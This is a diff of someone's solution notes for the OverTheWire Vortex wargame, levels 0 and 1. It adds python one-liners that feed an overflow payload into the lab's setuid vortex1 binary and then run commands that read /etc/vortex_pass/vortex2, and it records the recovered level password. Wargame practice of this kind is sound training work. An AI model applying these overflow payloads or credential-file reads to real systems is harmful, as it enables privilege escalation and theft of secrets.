@@ -1,3 +1,5 @@
+# ssh vortexn@vortex.labs.overthewire.org
+
 Level0:
 ------------------------------------------------
 L0.py 
@@ -10,6 +12,7 @@ Level 1:
 python -c 'print "\\"*257 + "\xca" + "A"' | ./vortex1
 sh-4.1# exit
 
+Method 1)
 How bash handles EOF..
 http://byteninja.blogspot.ro/2011/09/overthewireorg-vortex-level1.html
 
@@ -19,6 +22,10 @@ cat /etc/vortex_pass/vortex2
 
 vortex1@melissa:/vortex$ python -c 'print "\\"*257 + "\xca" + "A"' | env ENV=/tmp/cmd2 /vortex/vortex1
 23anbT\rE
+
+Method 2)
+http://www.pixelbeat.org/programming/stdio_buffering/
+python -c 'print  "\\"*0x101+"\xcaA\n"+"A"*4000+"\nwhoami\ncat /etc/vortex_pass/vortex2"' |/vortex/vortex1
 
 Username: vortex2 Password: 23anbT\rE
 
